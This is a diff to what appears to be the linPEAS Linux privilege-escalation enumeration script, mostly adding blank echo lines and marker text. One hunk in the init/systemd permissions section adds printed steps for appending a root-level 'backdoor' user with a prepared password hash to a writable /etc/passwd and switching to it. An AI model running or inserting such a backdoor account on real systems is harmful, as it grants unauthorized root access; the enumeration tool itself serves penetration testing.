@@ -3677,6 +3677,7 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
     fi
   done
   echo ""
+  echo ""
 fi
 
 if ! [ "$SEARCH_IN_FOLDER" ]; then
@@ -3791,12 +3792,14 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
       fi
     done | grep -Ev "\sroot\s+root" | grep -v " $USER " | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$binW,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED}," | sed "s,root,${SED_GREEN},"
     echo ""
+	echo ""
   fi
 fi
 
 if ! [ "$SEARCH_IN_FOLDER" ] && ! [ "$NOUSEPS" ]; then
   print_2title "Processes whose PPID belongs to a different user (not root)"
   print_info "You will know if a user can somehow spawn processes as a different user"
+  print_info "++++++++++++"
   print_info "Example: Proc 11042 with ppid 1922 is run by user root but the ppid user is www-data"
   print_info "Run ps -fp 11042 to see exactly what command is running as root"
   print_info "Run ps -fp 1922 to see what www-data process spawned it"
@@ -4606,6 +4609,7 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
         echo ""
     else
         echo ""
+		echo ""
     fi
     # Check for systemd services with writable paths
     print_list "Services with writable paths? . "$NC
@@ -4655,6 +4659,7 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
         echo ""
     fi
     echo ""
+	echo ""
     print_2title "Systemd PATH"
     print_info "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths"
     if check_systemctl; then
@@ -6819,6 +6824,7 @@ echo ""
 print_3title "Users with sudo privileges in sudoers"
 grep -v "^#" /etc/sudoers 2>/dev/null | grep -v "^$" | grep -v "^Defaults" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,$USER,${SED_RED_YELLOW},g" | sed "s,root,${SED_RED},g"
 echo ""
+echo ""
 
 print_2title "Users with console"
 if [ "$MACPEAS" ]; then
@@ -6857,7 +6863,7 @@ else
   fi
 fi
 echo ""
-
+echo ""
 print_2title "All users & groups"
 if [ "$MACPEAS" ]; then
   dscl . list /Users | while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
@@ -8034,6 +8040,7 @@ if [ "$PSTORAGE_MYSQL" ] || [ "$DEBUG" ]; then
   done
 fi
 echo ""
+echo ""
 #-- SI) Mysql version
 if [ "$(command -v mysql || echo -n '')" ] || [ "$(command -v mysqladmin || echo -n '')" ] || [ "$DEBUG" ]; then
   print_2title "MySQL version"
@@ -8097,6 +8104,7 @@ else
     fi
     ### ------------------------------------------------------------------------------------------------------------------------------------------------ ###
   fi
+  echo ""
 fi
 
 if [ "$PSTORAGE_PGP_GPG" ] || [ "$DEBUG" ]; then
@@ -8275,6 +8283,7 @@ if [ "$PSTORAGE_SPLUNK" ] || [ "$SPLUNK_BIN" ] || [ "$DEBUG" ]; then
       cat "$f" 2>/dev/null | grep "'pass'|'password'|'user'|'database'|'host'|\$" | sed -${E} "s,password|pass|user|database|host|\$,${SED_RED},"
     fi
   done
+  echo ""
   echo ""
 fi
 
@@ -8615,6 +8624,7 @@ if [ "$MACPEAS" ] && ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$(command -v ge
   ls -RAle / 2>/dev/null | grep -v "group:everyone deny delete" | grep -E -B1 "\d: " | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED}," | sed -${E} "s,$writeVB,${SED_RED_YELLOW},g" | sed -${E} "s,$writeB,${SED_RED},g"
 fi
 echo ""
+echo ""
 
 if ! [ "$SEARCH_IN_FOLDER" ]; then
   print_2title "Capabilities"
@@ -8672,6 +8682,7 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
       fi
     done
     echo ""
+	echo ""
     print_3title "Processes with capability sets (non-zero CapEff/CapAmb, limit 40)"
     find /proc -maxdepth 2 -path "/proc/[0-9]*/status" 2>/dev/null | head -n 400 | while read -r proc_status; do
       proc_pid=$(echo "$proc_status" | cut -d/ -f3)
@@ -8709,6 +8720,8 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
     (cat "/proc/$PPID/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${SED_GREEN},") 2>/dev/null || echo_not_found "/proc/$PPID/status"
     echo ""
   fi
+  echo ""
+  echo ""
   echo ""
   echo "Files with capabilities (limited to 50):"
   getcap -r / 2>/dev/null | head -n 50 | while read cb; do
@@ -8824,11 +8837,17 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
     check_critial_root_path "/etc/profile.d/"
   fi
   echo ""
+  echo ""
 fi
 
 if ! [ "$SEARCH_IN_FOLDER" ]; then
 print_2title "Permissions in init, init.d, systemd, and rc.d"
   print_info "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd"
+  print_info "++++++++++++ If passwd writeable:"
+print_info "1. Generate password 'openssl passwd P455w0rd' or following above link"
+print_info "2. Add user as root echo 'backdoor:$1$US1UVD20$juaWKM0l4kHRX9W.KpYun/:0:0:root:/root:/bin/bash' >> /etc/passwd"
+print_info "3. cat /etc/passwd to verify user been added. then just change user su backdoor"
+
   if [ ! "$MACPEAS" ] && ! [ "$IAMROOT" ]; then #Those folders don´t exist on a MacOS
     check_critial_root_path "/etc/init/"
     check_critial_root_path "/etc/init.d/"
@@ -8899,6 +8918,7 @@ if ! [ "$SEARCH_IN_FOLDER" ]; then
   print_2title "Searching root files in home dirs (limit 30)"
   (find $HOMESEARCH -user root 2>/dev/null | head -n 30 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g") || echo_not_found
   echo ""
+  echo ""
 fi
 
 if ! [ "$IAMROOT" ]; then
@@ -8912,6 +8932,7 @@ if ! [ "$IAMROOT" ]; then
   print_info "You can read or execute these files or binaries ++++++++++++"
   
   (find $ROOT_FOLDER -type f -user root ! -perm -o=r ! -path "/proc/*" 2>/dev/null | grep -v "\.journal" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null | sed -${E} "s,/.*,${SED_RED},"; fi; done) || echo_not_found
+  echo ""
   echo ""
   echo ""
 fi
@@ -8929,6 +8950,7 @@ if ! [ "$IAMROOT" ]; then
       echo "$l" | sed -${E} "s,$writeB,${SED_RED},"
     fi
   done
+  echo ""
   echo ""
   echo ""
 fi
@@ -9148,6 +9170,7 @@ fi
 print_2title "Log files with potentially weak perms (limit 50)"
 find /var/log -type f -ls 2>/dev/null | grep -Ev "root\s+root|root\s+systemd-journal|root\s+syslog|root\s+utmp" | sed -${E} "s,.*,${SED_RED},g" | head -n 50
 echo ""
+echo ""
 
 if ! [ "$SEARCH_IN_FOLDER" ]; then
   print_2title "Files inside $HOME (limit 20)"
@@ -9170,6 +9193,7 @@ fi
 if ! [ "$SEARCH_IN_FOLDER" ]; then
   print_2title "Mails (limit 50)"
   (find /var/mail/ /var/spool/mail/ /private/var/mail -type f -ls 2>/dev/null | head -n 50 | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_GREEN},g" | sed "s,$USER,${SED_RED},g") || echo_not_found
+  echo ""
   echo ""
 fi
 
